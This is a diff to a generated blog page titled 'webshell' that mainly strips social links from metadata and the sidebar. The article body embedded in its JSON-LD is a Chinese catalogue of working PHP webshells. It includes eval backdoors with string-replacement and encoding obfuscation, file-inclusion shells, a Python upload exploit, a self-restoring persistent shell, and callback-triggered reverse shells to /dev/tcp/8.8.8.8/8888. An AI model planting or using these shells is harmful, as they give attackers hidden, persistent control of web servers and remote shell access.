@@ -11,7 +11,7 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"\n\n直接使用eval1&lt;?php @eval($_POST[shell]);?&gt;\n\n字符替换替换一替换参数\n1&lt;?php $s=$_POST['shell']; @eval(\"$s;\");?&gt;\n\n替换二替换函数\n1&lt;?php $s=str_replace('x','','exxvxxaxxl'); @$s($_POST[shell]);?&gt;\n\n替换三替换函数进阶1&lt;?php @$_GET[func]($_POST[code]);?&gt;\n\n截断替换1&lt;?php $s=substr('helloworldeval',10);@$s($_POST[shell]);?&gt;\n\n替换四通过索引取md5值中的字符，再加上chr转换构造出assert\n12345&lt;?php$a=md5('a').'&lt;br&gt;';$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);$poc($_GET['a']);?&gt;\n\n编码构造base64() :使用base64对数据进行编码\ngzdeflate() :对数据进行Deflate压缩，gzinflate()解压缩\nstr_rot13() :对字符串执行 ROT13 转换\nbae64编码参数编码\n1&lt;?php @base64_decode($_GET['a'])($_GET[b]);?&gt;\n\n1eval(gzinflate(base64_decode($code)));\n\n文件包含型后门includeinclude可以解析php，不管文件的后缀是什么样的\n12$filename=$_GET['code']; include ($filename);\n\n可以上传一个txt后缀格式的文件，包含一下\ninclude进阶php有一个特性，接受上传的临时文件，在这个请求结束后，会把临时文件删除，所以必须在上传文件的请求包内，调用webshell\ntshell.php\n123&lt;?phpinclude($_FILES[\"file\"][\"tmp_name\"]);?&gt;\n\nexp.py\n1234567# -*- coding: utf-8 -*-import requestsurl = \"http://127.0.0.1/tshell.php?c=system('id');\"files = &#123;'file': ('filename.php', '&lt;?php eval($_REQUEST[c]);?&gt;', 'image/jpeg')&#125;response = requests.post(url, files=files)content = response.contentprint content\n\n包含请求头1&lt;?php system($_SERVER['HTTP_USER_AGENT']);?&gt;\n\n通过user_agent传参\n内存驻留马123456789101112&lt;?php    ignore_user_abort(true);    set_time_limit(0);    $file = 'c.php';    $code = '&lt;?php eval($_POST[c]);?&gt;';    while(true) &#123;        if(!file_exists($file)) &#123;            file_put_contents($file, $code);        &#125;        usleep(50);    &#125;?&gt;\n\ncreate_function()回调函数ob_start1&lt;?php function a($b)&#123;exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1\"');&#125;ob_start(\"a\");?&gt;\n\nheader_register_callback12&lt;?php function a() &#123;exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1\"');&#125;header_register_callback('a');?&gt;&lt;?php function a() &#123;$_GET[c]($_GET[d]);&#125;header_register_callback('a');?&gt;\n\nfilter_input12345# 需要 POST 一个 C 参数 , 就会触发反弹 shell&lt;?php function a($value)&#123; exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1\"');&#125;filter_input(INPUT_POST, 'c', FILTER_CALLBACK, array('options' =&gt; 'a'));?&gt;# 直接菜刀连接 , 密码为 chttp://127.0.0.1/index.php?&amp;c=assert&amp;d=eval($_POST['c'])&lt;?php function a($c)&#123;$c($_GET['d']);&#125;filter_input(INPUT_GET,'c', FILTER_CALLBACK,array('options'=&gt;'a'));?&gt;\n\n类似的函数还有\n123filter_var() - Filters a variable with a specified filterfilter_input_array() - Gets external variables and optionally filters themfilter_var_array() - Gets multiple variables and optionally filters them\n\nstream_wrapper_register12345678910&lt;?phpclass A&#123;    function __construct()&#123;        phpinfo();        // $_GET[c]($_GET[d]);    &#125;&#125;stream_wrapper_register(\"st\", \"A\");$fp = fopen(\"st://\",\"r\");?&gt;\n\n参考链接\nhttps://www.anquanke.com/post/id/85083\nhttps://www.jianshu.com/p/13cb1d8d0441\n","dateCreated":"2019-09-28T09:47:26+08:00","dateModified":"2019-10-09T10:22:05+08:00","datePublished":"2019-09-28T09:47:26+08:00","description":"","headline":"webshell","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/28/webshell/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/09/28/webshell/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\n直接使用eval1&lt;?php @eval($_POST[shell]);?&gt;\n\n字符替换替换一替换参数\n1&lt;?php $s=$_POST['shell']; @eval(\"$s;\");?&gt;\n\n替换二替换函数\n1&lt;?php $s=str_replace('x','','exxvxxaxxl'); @$s($_POST[shell]);?&gt;\n\n替换三替换函数进阶1&lt;?php @$_GET[func]($_POST[code]);?&gt;\n\n截断替换1&lt;?php $s=substr('helloworldeval',10);@$s($_POST[shell]);?&gt;\n\n替换四通过索引取md5值中的字符，再加上chr转换构造出assert\n12345&lt;?php$a=md5('a').'&lt;br&gt;';$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);$poc($_GET['a']);?&gt;\n\n编码构造base64() :使用base64对数据进行编码\ngzdeflate() :对数据进行Deflate压缩，gzinflate()解压缩\nstr_rot13() :对字符串执行 ROT13 转换\nbae64编码参数编码\n1&lt;?php @base64_decode($_GET['a'])($_GET[b]);?&gt;\n\n1eval(gzinflate(base64_decode($code)));\n\n文件包含型后门includeinclude可以解析php，不管文件的后缀是什么样的\n12$filename=$_GET['code']; include ($filename);\n\n可以上传一个txt后缀格式的文件，包含一下\ninclude进阶php有一个特性，接受上传的临时文件，在这个请求结束后，会把临时文件删除，所以必须在上传文件的请求包内，调用webshell\ntshell.php\n123&lt;?phpinclude($_FILES[\"file\"][\"tmp_name\"]);?&gt;\n\nexp.py\n1234567# -*- coding: utf-8 -*-import requestsurl = \"http://127.0.0.1/tshell.php?c=system('id');\"files = &#123;'file': ('filename.php', '&lt;?php eval($_REQUEST[c]);?&gt;', 'image/jpeg')&#125;response = requests.post(url, files=files)content = response.contentprint content\n\n包含请求头1&lt;?php system($_SERVER['HTTP_USER_AGENT']);?&gt;\n\n通过user_agent传参\n内存驻留马123456789101112&lt;?php    ignore_user_abort(true);    set_time_limit(0);    $file = 'c.php';    $code = '&lt;?php eval($_POST[c]);?&gt;';    while(true) &#123;        if(!file_exists($file)) &#123;            file_put_contents($file, $code);        &#125;        usleep(50);    &#125;?&gt;\n\ncreate_function()回调函数ob_start1&lt;?php function a($b)&#123;exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1\"');&#125;ob_start(\"a\");?&gt;\n\nheader_register_callback12&lt;?php function a() &#123;exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1\"');&#125;header_register_callback('a');?&gt;&lt;?php function a() &#123;$_GET[c]($_GET[d]);&#125;header_register_callback('a');?&gt;\n\nfilter_input12345# 需要 POST 一个 C 参数 , 就会触发反弹 shell&lt;?php function a($value)&#123; exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1\"');&#125;filter_input(INPUT_POST, 'c', FILTER_CALLBACK, array('options' =&gt; 'a'));?&gt;# 直接菜刀连接 , 密码为 chttp://127.0.0.1/index.php?&amp;c=assert&amp;d=eval($_POST['c'])&lt;?php function a($c)&#123;$c($_GET['d']);&#125;filter_input(INPUT_GET,'c', FILTER_CALLBACK,array('options'=&gt;'a'));?&gt;\n\n类似的函数还有\n123filter_var() - Filters a variable with a specified filterfilter_input_array() - Gets external variables and optionally filters themfilter_var_array() - Gets multiple variables and optionally filters them\n\nstream_wrapper_register12345678910&lt;?phpclass A&#123;    function __construct()&#123;        phpinfo();        // $_GET[c]($_GET[d]);    &#125;&#125;stream_wrapper_register(\"st\", \"A\");$fp = fopen(\"st://\",\"r\");?&gt;\n\n参考链接\nhttps://www.anquanke.com/post/id/85083\nhttps://www.jianshu.com/p/13cb1d8d0441\n","dateCreated":"2019-09-28T09:47:26+08:00","dateModified":"2019-10-09T10:22:05+08:00","datePublished":"2019-09-28T09:47:26+08:00","description":"","headline":"webshell","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/28/webshell/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/28/webshell/"}</script>
     <meta name="description" content="直接使用eval1&amp;lt;?php @eval($_POST[shell]);?&amp;gt;  字符替换替换一替换参数 1&amp;lt;?php $s=$_POST[&apos;shell&apos;]; @eval(&quot;$s;&quot;);?&amp;gt;  替换二替换函数 1&amp;lt;?php $s=str_replace(&apos;x&apos;,&apos;&apos;,&apos;exxvxxaxxl&apos;); @$s($_POST[shell]);?&amp;gt;  替换三替换函数进阶">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="webshell">
@@ -164,138 +164,6 @@
                         >
                         <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://github.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="GitHub"
-                        >
-                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">GitHub</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="http://stackoverflow.com/users"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Stack Overflow"
-                        >
-                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Stack Overflow</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://twitter.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Twitter"
-                        >
-                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://facebook.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://plus.google.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Google Plus"
-                        >
-                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Google Plus</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.linkedin.com/profile/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="LinkedIn"
-                        >
-                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">LinkedIn</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/mailto"
-                            
-                            rel="noopener"
-                            title="邮箱"
-                        >
-                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">邮箱</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/atom.xml"
-                            
-                            rel="noopener"
-                            title="RSS"
-                        >
-                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">RSS</span>
                     </a>
             </li>
             
